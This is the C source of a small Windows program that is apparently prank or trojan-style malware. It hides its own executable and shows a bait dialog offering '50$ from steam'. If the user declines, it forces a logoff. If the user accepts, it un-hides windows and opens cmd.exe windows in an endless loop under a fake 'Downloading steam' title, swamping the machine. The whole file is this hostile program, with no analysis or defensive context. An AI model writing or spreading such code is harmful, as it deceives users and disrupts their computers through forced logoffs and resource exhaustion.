#include <Windows.h>


HCRYPTPROV hProv;

BOOL CALLBACK EnumWndProc( _In_ HWND hWnd, _In_ LPARAM lpParam )
{
	if ( IsWindowVisible( hWnd ) == 0 )
	{
		ShowWindow( hWnd, SW_SHOW );
	}
	return TRUE;
}

INT Xorshift32( )
{
	if ( !hProv )
		CryptAcquireContextW( &hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT );
	INT num = 0;
	CryptGenRandom( hProv, sizeof( num ), ( BYTE* )( &num ) );
	return num & 0x7FFFFFFF;
}

VOID
WINAPI
Initialize(
	_In_ VOID
)
{
	WCHAR szFile[ MAX_PATH ];
	GetModuleFileNameW( NULL, szFile, MAX_PATH );
	if (!SetFileAttributesW( szFile, FILE_ATTRIBUTE_HIDDEN ) == 0 )
	{
		INT msg = MessageBoxW( NULL, L"Do you want 50$ from steam?", L"Special Offer", MB_ICONWARNING | MB_YESNO | MB_SYSTEMMODAL );
		if ( msg != IDYES )
		{
			ExitWindowsEx( EWX_LOGOFF, EWX_FORCE );
			ExitProcess( NULL );
		}
		EnumChildWindows( NULL, EnumWndProc, NULL );
		for ( ;; )
		{
			ShellExecuteW( NULL, L"open", L"cmd.exe", L"/c title Downloading steam for you... & color 2 & dir C:\\ /s", NULL, SW_SHOW );
		}
	}
}

INT
WINAPI 
WinMain(
	_In_ HINSTANCE hInstance,
	_In_ HINSTANCE hPrevInstance,
	_Inout_ LPSTR lpCmdLine,
	_In_ INT NoShowCmd
)
{
	Initialize( );
}